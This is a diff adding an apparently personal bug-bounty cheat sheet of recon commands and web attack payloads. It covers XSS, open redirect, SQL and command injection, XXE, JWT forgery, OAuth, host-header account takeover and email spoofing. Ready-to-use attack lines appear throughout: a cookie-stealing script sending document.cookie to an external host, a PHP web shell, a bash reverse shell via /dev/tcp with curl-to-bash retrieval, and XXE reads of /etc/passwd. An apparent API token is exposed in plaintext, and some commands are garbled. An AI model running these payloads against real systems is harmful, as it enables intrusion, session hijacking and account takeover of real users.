@@ -1,0 +1,919 @@
+Bug bounty private Programs dorks
+------------------------------------
+	"responsible disclosure program"
+	"vulnerability disclosure Program"
+	"vulnerability Program rewards"
+	"bugbounty reward program"
+	inurl: vulnerability disclosure
+	inurl: responsible disclosure
+	intitle:"responsible disclosure" private bug bounty
+	intitle:"responsible disclosure" bug bounty
+	-------------------------------------
+Subdomain finder
+-------------------------------------
+	amass (kali tool),sublist3r, assetfinder
+	
+	assetfinder -subs-only domain.com > asset.txt
+	sublist3r -d domain.com -o subdomain.txt 
+	---------------------------------
+Try subdomain takeover
+------------------------
+	after finding subdomain check subdomain takeover using the tool subjack
+	subjack -w domain.txt -v
+	subzy run --targets sub.txt
+-----------------------------------------------
+Check for s3 discosure
+----------------------
+	s3scanner -bucket-file sub.txt -enumerate 			(for conforming aws s3 ls s3://test.com)
+	./cloud_enum.py -k somecompany -k somecompany.io -k blockchaindoohickey
+	use lazys3 also for finding (ruby lazys3.rb company_name)
+	https://medium.com/@janijay007/s3-bucket-misconfiguration-from-basics-to-pawn-6893776d1007
+	if you found some azure https://payatu.com/blog/azure-storage-security/#What_is_Azure_Storage_Service
+	https://infosecwriteups.com/how-i-pwned-a-million-dollar-company-9fa5bfd234dd
+--------------------------------
+Find which subdomain are live
+-------------------------------------
+	httprobe (kali tool)        [use- cat my_subdomainlist.txt | httprobe]
+	httpx 						[./httpx -l /path/output-file-of-sublistn3r.txt -o live.txt] (here -l for list contains subdomains and -o for output list)
+	also u can use gowithness (alternative of eyewithness) for live screenshot
+	-----------------------------------------------------------------------
+Check for smuggling
+----------------------
+	using smuggler tool, command
+		python3 smuggler -u domain
+------------------------------
+Find Cors and other thing
+----------------------------
+	python3 corsy.py -i /path/urls.txt			(for find cors)
+-------------------------------------------------------------------------
+Find CRLF 
+-----------
+crlfuzz -l domain.txt
+-----------------------------------
+Dir search 
+------------
+Use meg for dirsearch also
+Oneline command for urls:
+	dirsearch -l urls.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output_imp.txt
+	https://github.com/random-robbie/bruteforce-lists/blob/master/aspx.txt 
+------------------------------
+Email Spoofing:
+--------------------
+	To check the SPF and DMARC policy mxtoolbox.com was used: https://mxtoolbox.com/SuperTool.aspx
+	This issue can be produced by any third party tool which can Fake Emails, for demo https://emkei.cz/ was used.
+	Open the site https://emkei.cz/
+	Enter all the details, ensure the from email is admin@target.com To Email can be any email which is accessible.
+	Now type the message and click on Send
+	Once message is received notice that the From email is admin@targte.com which looks legitimate.
+	--------------------------------------------------------------------------------------------------------
+Find Open redirection 
+-----------------------------
+	Openredirex
+	also use below dorks
+	site:domain.com inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http
+	
+To know the end point url of mass domain or single domain
+--------------------------------
+	echo "target.com" | gau --threads 5 >> endpoint.txt				(gau: is a tool for fatches known URLs from the wayback machine for any domain)
+	
+	or we can use katana
+		cat httpx.txt | katana -jc >> endpoint.txt 				(katana used for crawl the application)
+	then we can use "uro" tool to filtering duplecates endpoints
+		cat endpoint.txt | uro >> final_endpoint.txt
+	then use "gf" tool
+		cat final_endpoint.txt | gf xss >> xss_parameter.txt					
+	then use "Gxss" tool
+		cat xss_parameter.txt | Gxss -p khXSS -o xss_reflect.txt		(for knowing which parameter are reflecting)
+		
+One line command 
+----------------------
+	subfinder -d moonpig.com -all -silent | gau | uro | gf sqli > sql.txt; sqlmap.txt --batch --dbs --risk2 --level 5 --random-agent | tee -a sqli.txt
+	
+	echo "domain.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe
+	
+	use xsstrick also 
+		xsstrick -u domain.com --crawl -l 4
+Fuzz for file and directories
+------------------------------------
+	fuff (kali tool)
+	dirsearch
+	dirb  
+	----------------------------------
+parameter scanner
+--------------------------------------------
+	https://github.com/maK-/parameth
+	-------------------------------------------
+Try to bypass waf?
+	Read this https://github.com/maK-/parameth
+---------------------------------------------------------------------------
+	All the payload= https://github.com/swisskyrepo/PayloadsAllTheThings
+------------------------------------------------------------------------------
+If you found api key then try to validate this https://github.com/streaak/keyhacks
+----------------------------------------------------------------------------------------
+XSS
+-------
+	If GET parameter is not vulnerable check for POST
+	WAF bypass for xss
+	-----------------------
+	encoding payload or double encoding payload.
+	if the application is filter "/" the we can use like "<iframe src=https://brutelogic.com.br/2.js?c=", "<script src=https://brutelogic.com.br/2.js?c="
+	Test if <h2> is filter or not. If h2 tag is filtered try <%00h2? , %0d , %0a ,%09 etc..
+	Try </script/x> , <ScRipt>
+	<button onClick="alert(0)">Submit</button>
+	<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
+	<<script>alert(XSS)</script> #prepending an additional "<"
+	<script>alert(XSS) // #removing the closing tag
+	<script>alert`XSS`</script> #using backticks instead of parenetheses
+	java%0ascript:alert(1) #using encoded newline characters
+	<iframe src=http://malicous.com < #double open angle brackets
+	<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
+	<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
+	<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
+	<svg/%20src=x%20onmouseover%3D%22alert%26%230000000040%3B1) #Try for cloudfare WAF
+
+	Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
+	javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
+	<iframe src="javascript:alert(`xss`)"> #unicode encoding
+	/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
+	new Function`alt\`6\``; #using backticks instead of parentheses
+	data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
+	%26%2397;lert(1) #using HTML encoding
+	<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks 
+	<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
+	
+	check in email login 
+	"><svg/onload=alert(document.cookie)>"@x.yes
+	test+(<script>alert(0)</script>)@example.com
+	test@example(<script>alert(0)</script>).com
+	"<script>alert(0)</script>"@example.com
+	"<%=7*7%>"example.com
+	test+(${7*7})@example.com
+	test+({{7*7}})@example.com
+	user@test.burpcollaborator.net
+	user@[127.0.0.1]
+	"recipient@test.com\r\nRCPT TO:<victim+"@test.com
+	
+	cookie stealer
+	<script>document.location='https://colabrator.oastify.com?c='+document.cookie</script>
+	
+	still httponly cookie https://medium.com/bugbountytips/stored-xss-with-http-only-session-cookies-32e5eb121384
+	
+	if some character are changed by other 
+	For encodig character https://www.w3.org/MarkUp/html-spec/html-spec_13.html ------------------------------------------------------------------------------------------------------------------------------------------------------------
+HTML injection
+----------------------
+<iframe src=”http://malicious/web.html” width=1 height=1 style=”visibility:hidden;position:absolute”></iframe>
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+Open Redirecrion
+--------------------
+	If a the application indicates it inter path the there we can try open redirection eg:http://testfire.net/bank/customize.jsp?content=main.jsp (here we change content parameter)
+	\/yoururl.com
+	\/\/yoururl.com
+	\\yoururl.com
+	//yoururl.com
+	//theirsite@yoursite.com
+	/\/yoursite.com
+	https://yoursite.com%3F.theirsite.com/
+	https://yoursite.com%2523.theirsite.com/
+	https://yoursite?c=.theirsite.com/ (use # \ also)
+	//%2F/yoursite.com
+	////yoursite.com
+	https://theirsite.computer/
+	https://theirsite.com.mysite.com
+	/%0D/yoursite.com (Also try %09, %00, %0a, %07)
+	/%2F/yoururl.com
+	/%5Cyoururl.com
+	//google%E3%80%82com
+	<a target="_blank" href="javascript:alert()">
+	----------------------------------------------------------------------------------------------------
+File Upload vulnerability
+---------------------------------------
+	Php file Upload-
+	-------------------
+	php upload,upload virus.jpg then intercept the request change jpg to php,upload virus.php.jpg the remove the .jpg in burp,Change the content type(image/png to application/x-php),upload file with ,php4,ph5,php;.jpg ..like extention.
+	try to upload .txt, .svg and .xml file
+	we can upload php if it is filtered then try exploit.php%00.jpg,  virus.php/.jpeg , virus.html%0d%0a.jpg  
+	we can change file name in burp for xss eg- filename="demo.jpg<svg onload=confirm(0)>"
+	we can try to upload php with no extention eg-demo.
+	we can upload with no name only extention eg-.html then in the body part give the payload like <html>HTML CODE</html>
+	If the application read your body for image header we can try with upload a malisious file with bellow header,
+				filename="demo.html"
+				‰PNG
+				<script>alert(0)</script>
+	Try to upload a photo in 64250*64250px.(Read the blog-https://shahjerry33.medium.com/dos-mr-pixel-flood-27605add29f2)
+	Must read before test- https://medium.com/@Kamal_S/bwapp-file-upload-exploit-using-weevely-c337136850a
+							https://akash-venky091.medium.com/interesting-test-cases-of-file-uploading-vulnerabilities-3ad47f9e6149
+  
+  If the file shell is uploaded and it show the code of the shell then try to path traversal the application (https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
+  If the application is uses Apache try to upload the file with .htaccess (https://www.youtube.com/watch?v=b6R_DRT5CqQ)
+  
+  If we not bypass the upload and it read the content fo the file then we can create a image
+  exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o backdor.php
+  
+  if the application have pdf upload or download functionality then try to upload a xss pdf and use this tool.
+  
+  try to upload rce in race condition
+  
+  To upload php file use this code to create shell.php 
+   (<?php system($_GET["cmd"]); ?>) 
+  after uploading retrive the file in this format https://site.com/shell.php?cmd=id
+  
+  If you want to try to exploit rce to reverseshell then create the bash file shell.sh
+  
+	  #!/bin/bash
+	  bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
+  After that create the fortfowarding methon and list the port on netcat by using below command
+     nc -nvlp 1337
+  
+  then rerive navigate to https://site.com/shell.php?cmd=curl%20<ip/ngrok_domain>/shell.sh|bash
+  
+  
+  exif data check 
+  ------------------
+  check from this site https://onlineexifviewer.com/
+  you may find the exif data image from https://github.com/ianare/exif-samples/tree/master/jpg
+  If we get this vulnerability try to rce once. https://medium.com/@jr.mayank1999/rce-via-image-jpg-png-file-upload-8e4ad8a2100
+  
+  
+  
+  What file upload to do what------
+  asp/aspx/phps/php/php3-webshell/rce
+  svg-store xss/ssrf {for ssrf(<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>)}
+  gif-store xss
+  csv-csv injection
+  xml-xxe
+  avi-lfi/ssrf
+  html/js-html injection/xss/open redirect
+  png/jpeg-pixel flood attack
+  zip-rce via lfi
+  pdf/pptx-ssrf/blind xxe
+  Other upload functionality we should check:
+	-----------------------------------------------------
+	Upload a file with same name upload previously,antiautomation,large file name,upload with name ".","..","..." the check the path,upload file with crossdomain.xml or clientaccesspolicy.xml for content hijacking.
+-----------------------------------------------------------------------------------------------------------------
+IDOR
+-----------------------------
+	In JSON token look for PUT request
+	if application have these parameter {"example":"example"} , try to inject a extra parameter and see what will be the output {"example":"example","id":"1"}
+	
+	https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489
+	https://mokhansec.medium.com/full-account-takeover-worth-1000-think-out-of-the-box-808f0bdd8ac7
+	----------------------------------------------------------------------------------------------------------------------------------------------------------
+SQL injection
+----------------
+	
+	'or sleep(15) and 1=1#
+	'or sleep(15)#
+	'union select sleep(15).null#
+	---------------------------------------------------------------------------------------------------------
+
+Command Injection:
+1. 	We can inject some special characters to see if the application blocks anything that could be used for command injection:
+	&,;,Newline (0x0a or \n),&&,|,||,< (try ;ls, &ls etc)			(These are the delemeteters)
+	In case the application doesn’t throw any error messages, we can try injecting our command after using one of these delimiters.
+	https://vulnerable-website/endpoint?parameter=1|whoami
+	Observe that the parameter parses the command you inject
+	http://targetsite?id=blahblah;curl+$(whoami).xxxxx.burpcollaborator.net/
+	Note: This is a broad concept, above payload is just an example
+	The most common parameters that can be consider while testing for Command injection can be found below:
+	cmd,exec,command,execute,ping,query,jump,code,reg,do,func,arg,option,load,process,step,read,function,req,feature,exe,module,payload,run,print
+	bypass: cat$u+etc$u/passwd$u
+	Use--
+	https://example.com/admin.php?redirect=google.com;cat$u+etc$u/passwd$u
+2. Blind os command injection:
+	If we put any input and the out put is not show to us like any feedback form etc then we can try blind os command injection.
+	try-- for linux----- in burp capture the request and sent it to repeater then check each parameter by intruder.
+	eg- email=zyz & sleep 10 #								(Note:it is not encoded to encode in burp press ctrl+u) if the response is delay 10sec then sucesses  if not work chnge delemeter.
+	To show impact of this vulnerability https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
+3. If sleep not work try to "nslookup"
+	eg - email=xyz & nslookup burpcolabrator.net #						(Note:it is not encoded to encode in burp press ctrl+u)
+
+command1; command2   # Execute command1 and then command2
+command1 && command2 # Execute command2 only if command1 succeeds
+command1 || command2 # Execute command2 only if command1 fails
+command1 & command2  # Execute command1 in the background
+command1 | command2  # Pipe the output of command1 into command2
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
+Tool: commix 
+
+
+
+
+
+
+
+
+
+site:target.com -www
+site:target.com intitle:”test” -support
+site:target.com ext:php | ext:html
+site:subdomain.target.com
+site:target.com inurl:auth
+site:target.com inurl:dev
+-----------------------------------------------------------------------------------------------------
+JWT
+-------------------------
+	About JWT:https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
+	JWT has consist of 3 parts header, payload and signature.Combination of these 3 are called token.
+	The header and payload parts of a JWT are just base64url-encoded JSON objects. The header contains metadata about the token itself, while the payload contains the actual information about the user.
+	Test: For all these we can also use jwt_tool
+	1.	Edit the payload and send it to the application then check it is validate or not. (Use Burp repeter)
+	2.	Set the header algorithm to "none" and remove the signature then send to the application using burp repeter.
+	3.	If the Jwt uses HS256 then try JWT injection with path traversal:
+		Create a new symetric key using jwt editor(burp) the give the value for k is "AA==" click ok > send any request carring jwt to repeter and edit the "kid" value of header to "../../../../../../../dev/null" and change the payload as you want the sign the token then send the request.
+	4.	If HS256 used in the header then Brute-forcing secret keys using hashcat (hashcat -a 0 -m 16500 JWT_token.txt Common_secret_key_list.txt) IF the token is cracked then we can try to modyfy the token using JWT editor in burp(i prefer URL-https://jwt.io/ to edit jwt),Now past the new jwt token in the repeter and use it.
+		<Download the jwt_secret_list from here-https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list>
+		<Blog https://arz101.medium.com/portswigger-jwt-lab-3-798ab673b453>
+	5.	jwk injection: If RS256 used in the header then go to the jwt editor in burp > go to "New RSA key" > after the go to any request containing jwt and send to repeter > In the repeter edit the payload of the jwt as we want the in the right of the repeter go to the json web token click on attack with jwk (now see the in the jwt of request a header is added) > now send the request.
+	6.	jku injection: If the token dipend upon the 3rd party url then use this method.
+			If JWT in starting then you know that use jku injection.
+								{
+							"keys": [
+
+									]
+								}
+	7.	Algorithm confusion attack: If RS256 is used in the algorithm			(check https://portswigger.net/web-security/jwt/algorithm-confusion)
+		Check "/jwks.json" and "/.well-known/jwks.json" directory if key found in this directories then try this method or try next method.
+		Copy the key in site the present in the "[]" > go to the jwt edior in burp and "create a RSA" then copy the key and click ok > not Right clik on the key and click "copy as PEM" then > download jwt_tool in github and use the command eg-python3 jwt_tool.py <token> -X k -pk key.pem -I -pc sub -pv administrator.
+		If the token is cracked then a token is given now using this token sign the application.
+	8.	Algorithm confusion attack (if public key is not in the present):
+		
+try this https://medium.com/@musab_alharany/10-ways-to-exploit-json-web-token-jwt-ac5f4efbc41b	
+-------------------------------------------------------------------------------------------------------------------------
+OAuth
+--------------
+Recognizing when an application is using OAuth authentication is relatively straightforward. If you see an option to log in using your account from a different website, this is a strong indication that OAuth is being used. 
+There are 4 grand type but mainly use authontication code and implicit
+After capture the request see the authontication server by seeing Host and Once you know the hostname of the authorization server, you should always try sending a GET request to the following standard endpoints of resource server:
+    /.well-known/oauth-authorization-server
+    /.well-known/openid-configuration
+	Check:1
+	---------
+	In the implicit grant type, after the token is received from the server see a request goes from our client in this request there are some user data are present try to change these data and click to Request in browser > Open Original URL.
+	Mainly check /authentication path for this vulnerability
+	Check:2 
+	---------
+	Check if "state" parameter is present or not. If not present try to csrf. Try to steal the code and using that code request to server.
+	Check:3
+	-----------
+	Check if the redirect parameter is worked or not
+		If the redirection_url validates try to check with 
+															domain.com &@attacker.com#@attacker2.com
+															redirect_url=https://domain.com&redirect_url=https://attacker.com
+															localhost.evil-user.net
+	check:4
+	----------------
+	Check if the redirect parameter is not redirect try to path traversal by useing /../
+	eg- redirect_url=https://domain.com/auth/../ 					(if the application redirected to domain.com/) then conform that this is a vulnerability
+			refer- https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
+	check:5
+	-------------
+	check if the .well-known path is disclose in auth server or not
+
+create a user using manual abc@gmail.com then using same mail use oauth.
+
+passwd for bruteforce-https://github.com/danielmiessler/SecLists?source=post_page-----ec25f7f12e6d--------------------------------
+dirsearch 
+search parameter- https://github.com/s0md3v/Arjun?source=post_page-----ec25f7f12e6d--------------------------------
+check which method is supporting to the application in nmap -p 443 --script http-methods <ip>
+curl -v -X TRACE http://www.yourserver.com
+
+
+ssrf
+----------
+0.0.0.0:8080/test
+Pages for test-
+registration or login page- 
+	if a username is example@gmail.com and it is also login with example%00@gmail.com the we can try to create another acount with example%00@gmail.com and we have a chance to takeover the account of example@gmail.com.
+Login page-
+	Even if you don’t see one being used always try the most common, in various upper/lower cases: returnUrl, goto,
+	return_url, returnUri, cancelUrl, back, returnTo. (also try when redirect is posible -.amazonaws.com, .aws.amazon.com, http://localhost
+Reset password page-
+	Change Host to another url
+update page- csrf
+
+Blog-
+https://pentester.land/
+ Tools-
+https://bugbountyforum.com/tools/
+encoding-
+https://www.degraeve.com/reference/urlencoding.php
+
+
+
+crossdomain.xml--read a blog
+-------------------------------
+
+HTTP Methods
+------------------
+Enabled HTTP PUT method leads to create malicious file on the server:
+	Check the allowed HTTP methods
+	curl -v -X OPTIONS http://<target ip>/test/    (it is check also PUT, OPTION,etc)
+	If PUT method is enabled Upload a malicious file
+	curl --upload-file <file name> -v --url <target ip> -0 --http1.0
+	Observe that the file is uploaded without any problem
+	Try to lead to code execution using the malicious file
+
+LDAP injection: (Check in login page and search field)
+----------------------
+	Give a * , *) , *)) , *))) , ( , & , |  into the inpit field check for any error, If you application is changes or out put any error try LDAP injection.
+	Blog:https://book.hacktricks.xyz/pentesting-web/ldap-injection
+	https://wiki.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006) 		https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-a58ea2462cf2b98a868750b068a00fa32ccb807b%2FEN-Blackhat-Europe-2008-LDAP-Injection-Blind-LDAP-Injection.pdf?alt=media
+	------------------------------------------------------------------------------------------------------------------
+XML Injection:
+---------------
+Give a ' , " , < , > , & , <!-- , /--> , <![CDATA[ / ]]> ,  <![CDATA[]]>]]>, &entity;  if any error is comming then with xml then check for xml injection.
+ try- example id=1 in body then id=%26entity;    (%26entity; mean &entity;) then show any changes
+		 
+	Exploit:
+	1) In this case first check for ssrf the lfi
+	Suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:
+						<?xml version="1.0" encoding="UTF-8"?>
+						<stockCheck><productId>381</productId></stockCheck>
+
+		The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload:
+		<?xml version="1.0" encoding="UTF-8"?>
+		<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+		<stockCheck><productId>&xxe;</productId></stockCheck>
+	Note- If the external entity(in this case &xxe;) is blocked then try internal dtd 
+	<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]> 
+	then next step is upload a dtd file in server and control the server (see the port swiggerlab)
+	2) SSRF- use the uper method to ping the collabrator if it collabrate try to ssrf/blind
+	3) If the xml not present in the body of the request then try to insert &entity; or %26entity; it it gives any changes the know that it accept xml. then try bellow command 
+		productId=1&storeId=1 in the body the,
+		
+		productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+	4) if the any file upload functionality support svg file type then, make a .svg file containn bellow code (i use for lfi, it is use as ssrf) ( if the file restric change content type or search on google to upload a .svg and upload in the code in the .svg file)
+	<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+	5)if any error message come during xml please see the lab https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages  (for bling xml injection)
+	6)if blind xml fails see the video (https://www.youtube.com/watch?v=mAqY3OsVuE8&t=231s)
+	
+	
+	Note- for blind xml must go through https://portswigger.net/web-security/xxe/blind
+	----------------------------------------------------------------------------------------------------------------------------------------------------
+	
+Web socket:
+-----------------
+	Test- Change Origin Header if it is allow to change origin header then it will be vulnerability.
+	Test2- Test CSWH(Cross Site WebSocket Hijacking) use this site-https://www.fco.com/websocket-tester or we can use tool "websocat". After connetcting to the websocket try to xss, sql, modify the header and other stuf.
+	Test3- If Sec-Websocket-key is not used check for csrf
+
+LFI to RCE - https://aditya-chauhan17.medium.com/local-file-inclusion-lfi-to-rce-7594e15870e1 
+
+
+CRLF Injection:
+--------------------------
+>>GET /whitedevil			(404 Not Found)
+>>GET /%0D%0A%20Set-Cookie:crlfinjection=ak		(400 Bad Request) <mean our payload is blocked>
+>>GET /%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=ak		(200 OR 3xx Responsence) See the response
+>>GET /%E5%98%8D%E5%98%8DSet-Cookie:crlfinjection=ak		(200 OR 3xx Responsence) See the response
+
+Web Cache Poising and deception:
+=================================
+add a random extention(.css,.txt,.js,.img) in the end of the line like https://abcd.com/admin/random.css 
+then open in the incoginto mode.
+How to find: 1st make a random request like /ab=123 and click till the hit option are showed in the response. after that copy the url (eg- https://domain.com/ab=1234) and open it in the incoginto mode. then observed the response in the burp you will observed the age and hit option.
+After find the cache posisoing try to check the header the application allow use the "param miner" extention. (right click the request > extention > param miner > gauss param > gauss header)(also check right click the request > extention > param miner >param miner >rails param clocking scan)
+also you can change cookie value (if the cookie value is reflected) use -alert(0)- payload
+use utm_content=<script>alert(0)</script> in url
+
+
+What is the difference between web cache poisoning and web cache deception?
+
+    In web cache poisoning, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
+    In web cache deception, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.
+
+
+Host Header Attacks:
+--------------------------
+Check point: Host, add a additional Host bellow the Original Host, add X-Forwarded-Host
+
+1) If Arbitary host header is there check for password reset to account takeover and if the Host is block try X-Forwarded-Host ( Note if reset mail received in our changed mail "eg-https://changed-host.com/reset/token=123" then it is still a isseue) 
+	https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middlewarew
+2) if arbitary host header is not posible then try to reset password in this format "Host: realsite.com:random-string" if the reset link reflect something try to explore.
+3) If arbitary host header is present then try to get sensitive path like /admin and Host as localhost
+4) check for web cache poisioning if present then try to combine with arbitary host header injection
+5) If the application uses otp for verification use bruteforce and default otp like 1111,0000
+6) If the application uses otp for verification use to provide the parameter in request like code:1234 if you get 1234 in the email then go ahead.
+
+
+Labs for sql and all
+http://lab.awh.zdresearch.com/
+
+
+
+If a framework is found it search on kali terminal for "searchsploit apache"
+
+
+
+Host my site: https://www.geeksforgeeks.org/how-to-host-a-website-on-github-for-free/
+			https://www.geeksforgeeks.org/how-to-build-portfolio-website-and-host-it-on-github-pages/
+			https://gist.github.com/TylerFisher/6127328
+
+
+github page
+https://github.com/rzashakeri/beautify-github-profile
+https://bootcamp.uxdesign.cc/how-to-design-an-attractive-github-profile-readme-3618d6c53783
+
+cors:https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/
+
+
+Account takeover
+====================
+1. Using response manipulation (change 0 to 1)
+2. Using mail injection. (if the request is goes with otp and mobile number and only check for otp)
+3. Using mail injection. (add victim mail to otp send request remember add the mail first of the line)
+4. If we forget password and we reseceive a mail to click here and the link contain token then go to the google and search for "hash analyzer" if the hash is found please check for the hash of the username, id etc.. by using particular hash generator eg- md5 generator. if match click on the forget password password and enter the victim mail to generate a token the you change the token with hash.
+5. Using sign up functionality.(if we create an account with existing mail)
+6. (host header poising)	Click on reset the password on the application > Intercept the HTTP request in Burp Suite > Change the Host field to www.evilsite.com > If step 3 	doesn’t work out then add a new header X-Forwarded-Host: evil.com in the request. > The user will get a link like http://evil.com/reset_password/token when they click on it, and the attacker receive the reset password token and hijack the user account.
+7. Chage mail address in burp or add mail (eg:- "emil1@gmail.com,fakeemail@gmail.com","emil1@gmail.com@fakeemail@gmail.com","emil1@gmail.com%00:fakeemail@gmail.com, victim@gmail.tld!0a!0dcc:attacker@gmail.tl" we can use @,space | hexa etc..)
+8. via otp bypass
+
+
+
+SSTI
+--------------------------
+${{7*9}}
+{{7*9}}
+
+403 bypass
+------------
+To bypass 403 use tool 4 zero 3 and use the below command
+./403-bypass -u domain.com --exploit
+
+Wordpress site:
+-------------------
+wpscan --url target.com --disable-tls-checks --api-token <api-token> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
+
+api token- rwtrkrbx7Blx8uu3araD3NkSvffSVXaWTQlGEnT4GjY
+
+If you get xmlrpc.php enabled then try this
+https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32
+
+FTP
+--------------- 
+To extract the username and password of a file contain user:pass use the below command
+awk -F: '{print $1}' users.txt
+the bruteforce using hydra:
+hydra -L username.txt -P pass.txt ip protocol
+ 
+Graphql
+----------------
+blog:https://blog.intigriti.com/2024/05/31/five-easy-ways-to-hack-graphql-targets/
+tool- use the "inQL" burp extention for solving the graphql, Clairvoyance, we can use http://nathanrandal.com/graphql-visualizer/, https://graphql-kit.com/graphql-voyager/ site for vusualize the graphql
+	  use Graphw00f tool for finding the which backend language the API.
+	  Batchql
+	  graphql-path-enum for finding authorization flow
+	  GraphQL Cop for finding server side info disclosure and dos
+	  CrackQL
+Step for testing graphql- firstly identify the end point then try to then try to know field information
+	find the graphql  endpoint 
+    /graphql
+    /api
+    /api/graphql
+    /graphql/api
+    /graphql/graphql
+
+	Detecting query:
+	
+	query{
+	_typename
+	}
+	
+	introspection query:
+	
+	check for 
+	
+	{__schema {types {name}}}
+	
+	also check if query is allowed or not 
+	{
+        "query": "{__schema{queryType{name}}}"
+    }
+-------------------
+	query IntrospectionQuery {
+        __schema {
+            queryType {
+                name
+            }
+            mutationType {
+                name
+            }
+            subscriptionType {
+                name
+            }
+            types {
+             ...FullType
+            }
+            directives {
+                name
+                description
+                args {
+                    ...InputValue
+            }
+			
+            }
+        }
+    }
+
+    fragment FullType on __Type {
+        kind
+        name
+        description
+        fields(includeDeprecated: true) {
+            name
+            description
+            args {
+                ...InputValue
+            }
+            type {
+                ...TypeRef
+            }
+            isDeprecated
+            deprecationReason
+        }
+        inputFields {
+            ...InputValue
+        }
+        interfaces {
+            ...TypeRef
+        }
+        enumValues(includeDeprecated: true) {
+            name
+            description
+            isDeprecated
+            deprecationReason
+        }
+        possibleTypes {
+            ...TypeRef
+        }
+    }
+
+    fragment InputValue on __InputValue {
+        name
+        description
+        type {
+            ...TypeRef
+        }
+        defaultValue
+    }
+
+    fragment TypeRef on __Type {
+        kind
+        name
+        ofType {
+            kind
+            name
+            ofType {
+                kind
+                name
+                ofType {
+                    kind
+                    name
+                }
+            }
+        }
+    }
+	
+----------------------
+try this in url 
+
